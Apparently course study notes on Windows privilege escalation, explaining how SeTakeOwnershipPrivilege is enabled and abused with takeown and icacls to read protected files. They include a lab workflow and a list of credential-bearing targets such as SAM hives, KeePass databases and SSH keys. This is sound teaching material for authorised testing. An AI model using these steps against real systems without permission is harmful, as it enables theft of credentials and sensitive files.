# SeTakeOwnershipPrivilege

## ID
702

## Module
Windows Privilege Escalation

## Kind
notes

## Title
Section 9 — SeTakeOwnershipPrivilege

## Description
Abuse SeTakeOwnershipPrivilege to take ownership of protected files, modify their ACLs, and read sensitive content such as credentials or configuration files.

## Tags
setakeownershipprivilege, file-ownership, icacls, takeown, privilege-escalation, windows

## Commands
- `whoami /priv`
- `Import-Module .\Enable-Privilege.ps1`
- `.\EnableAllTokenPrivs.ps1`
- `takeown /f '<FILE_PATH>'`
- `icacls '<FILE_PATH>' /grant <USERNAME>:F`
- `cat '<FILE_PATH>'`
- `cmd /c dir /q '<DIRECTORY>'` (check file ownership)

## What This Section Covers
SeTakeOwnershipPrivilege lets a user take ownership of any securable object — files, folders, registry keys, AD objects, services, and processes. Once you own an object, you can modify its ACL to grant yourself full access. This is commonly assigned to service accounts running backups or VSS snapshots, and can be abused to read sensitive files like credentials, SSH keys, web configs, or KeePass databases.

## Methodology
1. RDP in and open an **elevated** PowerShell prompt.
2. Run `whoami /priv` to confirm `SeTakeOwnershipPrivilege` is present (it will show as Disabled).
3. Enable the privilege: `Import-Module .\Enable-Privilege.ps1` then `.\EnableAllTokenPrivs.ps1`.
4. Take ownership of the target file: `takeown /f '<FILE_PATH>'`.
5. Grant yourself Full Control: `icacls '<FILE_PATH>' /grant <USERNAME>:F`.
6. Read the file: `cat '<FILE_PATH>'`.

## Multi-step Workflow
```
# Enable the privilege
Import-Module C:\Tools\Enable-Privilege.ps1
C:\Tools\EnableAllTokenPrivs.ps1
whoami /priv    # confirm SeTakeOwnershipPrivilege is now Enabled

# Take ownership and read
takeown /f 'C:\TakeOwn\flag.txt'
icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F
cat 'C:\TakeOwn\flag.txt'
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Contents of `C:\TakeOwn\flag.txt` | (submit from your shell) | takeown → icacls grant → cat |

## Key Takeaways
- Taking ownership alone is NOT enough — you still need to modify the ACL with `icacls` before you can read the file.
- The privilege shows as **Disabled** by default; you must enable it at the token level before `takeown` will work (use the `Enable-Privilege.ps1` / `EnableAllTokenPrivs.ps1` scripts).
- This is a **destructive action** — changing file ownership is visible and hard to revert. On real engagements, document it and get client consent first.
- High-value targets for this technique: `web.config`, SAM/SYSTEM/SECURITY hives, `.kdbx` KeePass files, `passwords.*`, SSH keys, and config files.
- In AD environments, you can also use this on AD objects (not just files) if the privilege is assigned via GPO.

## Gotchas
- Must run from an **elevated** prompt or the privilege won't appear in `whoami /priv`.
- `takeown` succeeds but `cat` still fails? You forgot the `icacls /grant` step — ownership ≠ read access.
- The Enable-Privilege scripts must be in your current directory or called with full paths (e.g. `C:\Tools\Enable-Privilege.ps1`).
- On real engagements, revert ownership and ACL changes afterward, or document them clearly in your report appendix.
